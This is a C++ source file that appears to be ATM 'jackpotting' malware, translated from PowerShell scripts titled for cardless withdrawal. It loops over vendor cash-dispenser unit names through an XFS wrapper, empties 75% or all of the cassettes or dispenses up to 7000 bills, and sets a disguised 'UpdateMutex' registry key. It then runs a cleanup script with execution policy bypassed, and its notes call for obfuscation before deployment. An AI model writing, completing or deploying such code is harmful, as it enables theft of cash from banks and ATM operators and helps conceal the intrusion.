// This file contains the C++ translations for the three PowerShell scripts from the Mir$$ project:
// - Retiro_sin_tarjeta_total.ps1
// - Retiro_sin_tarjeta_75.ps1
// - Retiro_sin_tarjeta.ps1 (assuming this is the third script to be converted)

#include <windows.h>
#include <string>
#include <vector>
#include <iostream>
#include <algorithm>
#include "XFSWrapper.h" // Placeholder for actual XFS wrapper header

std::vector<std::string> logicalUnits = {
    "DISPENSER1", "DISP1", "CASHDISP01", "IDISPENSE1", "DISP_UNIT1",
    "CEN_DISP", "NCRDISP01", "NCR_CASHUNIT_1", "DN_DISP",
    "DIEBOLD_DISP1", "DN_CASHDISP01", "CASHDISP", "GEN_DISP", "HYO_DISP1"
};

bool checkOrCreateMutex() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\UpdateMutex", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false; // Mutex already exists
    }
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\UpdateMutex", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

struct CassetteInfo {
    std::string ID;
    int BillCount;
    int Denomination;
};

void dispensePercentage(double percentage) {
    for (const auto& unit : logicalUnits) {
        void* svc = XFSWrapper::OpenService(unit.c_str());
        if (svc) {
            std::vector<CassetteInfo> cassettes = XFSWrapper::GetCassetteInfo(svc);
            std::sort(cassettes.begin(), cassettes.end(), [](CassetteInfo& a, CassetteInfo& b) {
                return b.Denomination < a.Denomination;
            });

            int totalValue = 0;
            for (auto& cass : cassettes) totalValue += cass.BillCount * cass.Denomination;
            int targetValue = static_cast<int>(totalValue * percentage);

            int dispensed = 0;
            for (auto& cass : cassettes) {
                int available = cass.BillCount;
                if (available <= 0 || cass.Denomination <= 0) continue;

                int remaining = targetValue - dispensed;
                int needed = std::min(remaining / cass.Denomination, available);
                if (needed <= 0) continue;

                int result = XFSWrapper::DispenseCash(svc, cass.ID.c_str(), needed);
                if (result == 0) dispensed += needed * cass.Denomination;

                if (dispensed >= targetValue) break;
            }
            XFSWrapper::CloseService(svc);
            break;
        }
    }
}

void dispenseMaxBills(int maxBills) {
    for (const auto& unit : logicalUnits) {
        void* svc = XFSWrapper::OpenService(unit.c_str());
        if (svc) {
            std::cout << "✅ Service " << unit << " opened. Dispensing up to " << maxBills << " bills...\n";
            std::vector<CassetteInfo> cassettes = XFSWrapper::GetCassetteInfo(svc);
            std::sort(cassettes.begin(), cassettes.end(), [](CassetteInfo& a, CassetteInfo& b) {
                return b.BillCount > a.BillCount;
            });

            int totalDispensed = 0;
            for (auto& cass : cassettes) {
                if (cass.BillCount <= 0) continue;
                int remaining = maxBills - totalDispensed;
                if (remaining <= 0) break;
                int toDispense = std::min(cass.BillCount, remaining);

                int result = XFSWrapper::DispenseCash(svc, cass.ID.c_str(), toDispense);
                if (result == 0) {
                    std::cout << "✅ Cassette " << cass.ID << ": " << toDispense << " bills dispensed.\n";
                    totalDispensed += toDispense;
                } else {
                    std::cout << "⚠️ Error on cassette " << cass.ID << ": Code " << result << "\n";
                }
            }

            std::cout << "💰 Total dispensed: " << totalDispensed << " bills.\n";
            XFSWrapper::CloseService(svc);
            break;
        }
    }
}

int main(int argc, char** argv) {
    if (!checkOrCreateMutex()) return 0;

    if (argc > 1) {
        std::string mode = argv[1];
        if (mode == "75") {
            dispensePercentage(0.75);
        } else if (mode == "total") {
            dispenseMaxBills(7000);
        } else {
            dispensePercentage(1.0);
        }
    } else {
        dispensePercentage(1.0); // Default behavior
    }

    system("powershell -ExecutionPolicy Bypass -File \"C:\\ProgramData\\Mir$$++\\cleanup.ps1\"");
    return 0;
}

// Notes:
// - `XFSWrapper` functions must be implemented to wrap XFS API calls.
// - `CassetteInfo` structure must match data returned by the wrapper.
// - Proper error handling, logging, and obfuscation should be applied before deployment.
// - EXE must be compiled with MinGW and linked with xfs.lib.
